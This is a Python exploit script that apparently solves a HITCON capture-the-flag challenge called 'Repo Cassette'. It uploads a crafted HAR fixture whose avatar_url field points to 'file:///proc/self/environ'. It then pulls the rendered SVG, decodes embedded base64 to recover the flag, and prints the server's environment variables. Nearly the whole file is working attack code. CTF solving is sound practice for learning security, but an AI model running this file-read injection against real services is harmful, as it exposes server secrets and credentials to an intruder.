#!/usr/bin/env python3
import argparse
import base64
import gzip
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid


FLAG_PATTERNS = [
    re.compile(rb'HITCON\{[^}\x00\r\n]+\}'),
    re.compile(rb'FLAG=[^\x00\r\n]+'),
]


def github_token():
    token = os.environ.get('GH_TOKEN') or os.environ.get('GITHUB_TOKEN')
    if token:
        return token
    return subprocess.check_output(['gh', 'auth', 'token'], text=True).strip()


def request(url, *, method='GET', headers=None, body=None, timeout=20):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.headers, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.headers, error.read()


def github_json(path, token):
    status, _, body = request(
        f'https://api.github.com{path}',
        headers={
            'Accept': 'application/vnd.github+json',
            'Authorization': f'Bearer {token}',
            'User-Agent': 'repo-cassette-private-solver',
            'X-GitHub-Api-Version': '2022-11-28',
        },
    )
    if status != 200:
        raise RuntimeError(f'GitHub API returned HTTP {status}: {body[:300]!r}')
    return json.loads(body)


def artifact_payload(repository):
    return json.dumps({
        'full_name': repository,
        'owner': {'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'},
        'description': 'Repo Cassette private artifact',
        'stargazers_count': 0,
    }, separators=(',', ':')).encode()


def multipart(fields, filename, file_bytes):
    boundary = f'----repo-cassette-{uuid.uuid4().hex}'
    chunks = []
    for name, value in fields.items():
        chunks.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
        )
    chunks.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="capture"; filename="{filename}"\r\n'
        'Content-Type: application/json\r\n\r\n'.encode()
    )
    chunks.append(file_bytes)
    chunks.append(f'\r\n--{boundary}--\r\n'.encode())
    return f'multipart/form-data; boundary={boundary}', b''.join(chunks)


def create_fixture(base, repository, payload):
    har = json.dumps({
        'log': {'entries': [{
            'request': {'url': f'https://api.github.com/repos/{repository}'},
            'response': {
                'headers': [{'name': 'Content-Type', 'value': 'application/json'}],
                'content': {'text': payload.decode()},
            },
        }]},
    }, separators=(',', ':')).encode()
    content_type, body = multipart({'repository': repository, 'entryIndex': '0'}, 'capture.har', har)
    status, _, response = request(
        f'{base}/api/fixtures', method='POST', headers={'Content-Type': content_type}, body=body,
    )
    try:
        result = json.loads(response)
    except json.JSONDecodeError:
        raise RuntimeError(f'Fixture upload returned HTTP {status}: {response[:300]!r}')
    if status != 201:
        raise RuntimeError(f'Fixture upload returned HTTP {status}: {result}')
    return result


def decode_svg(svg):
    matches = re.findall(rb'data:[^;"\']+;base64,([A-Za-z0-9+/=]+)', svg)
    for encoded in matches:
        data = base64.b64decode(encoded)
        for pattern in FLAG_PATTERNS:
            match = pattern.search(data)
            if match:
                return match.group().decode(errors='replace'), data
    return None, None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('base_url', help='Repo Cassette instance, e.g. http://host:port')
    parser.add_argument('github_repo', help='Private repository in OWNER/REPO form')
    args = parser.parse_args()
    base = args.base_url.rstrip('/')
    token = github_token()

    listing = github_json(f'/repos/{args.github_repo}/actions/artifacts?per_page=100', token)
    artifacts = [
        item for item in listing.get('artifacts', [])
        if item.get('name', '').startswith(('repo-cassette-', 'cassette-')) and not item.get('expired')
    ]
    if not artifacts:
        raise SystemExit('No Repo Cassette artifacts found. Run the private workflow first.')

    diagnostics = []
    for artifact in artifacts:
        repository = f'{args.github_repo}/actions/artifacts/{artifact["id"]}/zip'
        payload = artifact_payload(repository)
        print(f'[*] Trying {artifact["name"]} ({artifact["id"]})')
        try:
            fixture = create_fixture(base, repository, payload)
        except Exception as error:
            diagnostics.append((artifact['name'], f'upload: {error}'))
            continue
        if not fixture.get('sourceSha256'):
            diagnostics.append((artifact['name'], 'sourceSha256 is null'))
            continue

        fixture_id = fixture['id']
        status, headers, _ = request(f'{base}/view/{fixture_id}')
        content_type = headers.get('Content-Type', '')
        postcard_status, _, postcard_body = request(f'{base}/api/postcards/{fixture_id}')
        if postcard_status != 200:
            diagnostics.append((artifact['name'], f'view={status} {content_type!r}, postcard={postcard_status}'))
            continue
        postcard = json.loads(postcard_body)
        if not postcard.get('verified'):
            diagnostics.append((artifact['name'], f'view={content_type!r}, postcard not verified'))
            continue

        image_path = postcard['image']
        image_status, _, svg = request(f'{base}{image_path}')
        if image_status != 200:
            diagnostics.append((artifact['name'], f'image HTTP {image_status}'))
            continue
        flag, environ = decode_svg(svg)
        if flag:
            print(f'[+] {flag}')
            return 0
        diagnostics.append((artifact['name'], f'verified but no flag; SVG bytes={len(svg)}'))
        if environ:
            print(environ.replace(b'\x00', b'\n').decode(errors='replace'))

    print('[-] No candidate succeeded:', file=sys.stderr)
    for name, reason in diagnostics:
        print(f'    {name}: {reason}', file=sys.stderr)
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
